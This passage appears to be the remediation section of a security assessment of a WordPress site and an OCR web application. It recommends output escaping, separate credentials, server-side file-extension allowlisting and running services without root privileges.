- **Sanitise and escape all user-supplied input before rendering it in the admin interface.** The contact form message body must be HTML-encoded before display. WordPress provides the `esc_html()` and `wp_kses()` functions for this purpose. Content Security Policy (CSP) headers should also be configured to prevent inline script execution.

- **Never reuse application credentials as system account passwords.** The `DB_PASSWORD` in `wp-config.php` should be a dedicated credential used only for the database connection. System account passwords must be distinct and managed separately. In this case, the WordPress database credentials are effectively dummy values (SQLite is used), making the credential reuse entirely avoidable.

- **Validate file extensions on save operations.** The OCR application's save endpoint must enforce an allowlist of permitted extensions (e.g., only `.txt`) rather than accepting arbitrary user-supplied filenames. Server-side validation is required; client-side or frontend restrictions are trivially bypassed.

- **Do not expose development servers on the filesystem.** The PHP built-in development server (`php -S`) is not designed for production use. Its document root is set to `/root/ocr4/`, meaning any file written to that directory is immediately executable. In addition to fixing the extension validation, the OCR application should run under a dedicated unprivileged service account rather than as root, so that a file write vulnerability cannot directly lead to root code execution.
